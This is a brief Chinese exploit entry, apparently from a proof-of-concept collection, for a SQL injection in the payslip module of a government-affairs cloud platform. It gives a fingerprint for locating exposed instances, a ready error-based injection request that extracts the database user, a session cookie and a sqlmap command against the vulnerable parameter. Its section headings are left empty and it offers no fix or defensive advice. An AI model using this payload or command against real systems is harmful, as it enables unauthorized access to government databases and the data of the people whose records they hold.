# 数字通指尖云平台-智慧政务payslipSQL注入漏洞

- **系统**：数字通指尖云平台-智慧政务payslip　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="中科数字通 "`
- **请求**：`GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=(SELECT 4050 FROM(SELECT COUNT(*),CONCAT((mid((ifnull(cast(current_user() as nchar),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: GOASESSID=i589f58naalabocmbidup7edl3`

**请求体 / payload**
```
sqlmap -u "http://xx.xx.xx.xx/payslip/search/index/userid/time/time?PayslipUser[user_id]=" --batch
```

**其他**
- 数字通指尖云平台-智慧政务payslip SQL注入漏洞: * 一、漏洞简介
  * 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 数字通指尖云平台-智慧政务